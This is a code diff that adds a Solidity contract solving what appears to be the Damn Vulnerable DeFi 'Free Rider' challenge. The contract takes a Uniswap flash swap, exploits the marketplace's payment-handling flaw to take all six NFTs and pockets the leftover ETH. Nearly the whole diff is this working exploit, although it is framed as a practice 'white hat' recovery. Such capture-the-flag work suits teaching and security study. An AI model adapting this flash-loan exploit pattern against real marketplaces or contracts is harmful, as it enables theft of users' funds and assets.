@@ -5,6 +5,89 @@ import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
+import "hardhat/console.sol";
+import "./FreeRiderNFTMarketplace.sol";
+import "../DamnValuableNFT.sol";
+
+contract WhiteHatSavior {
+    IUniswapV2Pair uniswap;
+    IWETH weth;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT token;
+    address recovery;
+    address player;
+
+
+    constructor(IUniswapV2Pair _uniswap, IWETH _weth, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _token, address _recovery) {
+        uniswap = _uniswap;
+        weth = _weth;
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+        player = msg.sender;
+    }
+
+    function becomeTheRichWhiteKnight() public {
+        // uniswap flashloan to borrow ETH :)
+        uniswap.swap(90 ether, 0, address(this), abi.encodeWithSelector(this.uniswapV2Call.selector));
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
+        // swap WETH for ETH
+        weth.withdraw(90 ether);
+
+        // Buy two tokens to create higher price to capture
+        uint256[] memory tokenID0 = new uint256[](2);
+        tokenID0[0] = 0;
+        tokenID0[1] = 1;
+        marketplace.buyMany{value: 30 ether}(tokenID0);
+
+        // Sell back at higher price
+        token.approve(address(marketplace), 0);
+        token.approve(address(marketplace), 1);
+        uint256[] memory price0 = new uint256[](2);
+        price0[0] = 90 ether;
+        price0[1] = 30 ether;
+        marketplace.offerMany(tokenID0, price0);
+
+        // Then: 'buy' all tokens
+        uint256[] memory tokenIDs = new uint256[](6);
+        tokenIDs[0] = 0;
+        tokenIDs[1] = 1;
+        tokenIDs[2] = 2;
+        tokenIDs[3] = 3;
+        tokenIDs[4] = 4;
+        tokenIDs[5] = 5;
+        marketplace.buyMany{value: 90 ether}(tokenIDs);
+
+        // Then: send all tokens to the free rider recovery contract
+        token.safeTransferFrom(address(this), recovery, 0);
+        token.safeTransferFrom(address(this), recovery, 1);
+        token.safeTransferFrom(address(this), recovery, 2);
+        token.safeTransferFrom(address(this), recovery, 3);
+        token.safeTransferFrom(address(this), recovery, 4);
+        token.safeTransferFrom(address(this), recovery, 5, abi.encode(address(this)));
+
+        // return uniswap ETH
+        weth.deposit{value: 90.28 * 10 ** 18}();
+        weth.transfer(address(uniswap), 90.28 * 10 ** 18);
+
+        // send ETH to player
+        player.call{value: address(this).balance}("");
+    }
+
+     function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
+        external
+        returns (bytes4)
+    {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+
 
 /**
  * @title FreeRiderRecovery
